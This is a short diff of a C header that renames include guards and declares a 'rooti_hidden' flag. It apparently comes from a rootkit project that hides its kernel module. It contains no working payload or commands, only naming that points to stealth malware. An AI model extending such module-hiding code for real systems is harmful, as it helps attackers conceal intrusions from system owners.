@@ -1,5 +1,5 @@
-#ifndef _ROOTI_MOD_HIDING_H
-#define _ROOTI_MOD_HIDING_H
+#ifndef _ROOTI_HIDE_H
+#define _ROOTI_HIDE_H
 
 extern bool rooti_hidden;
 
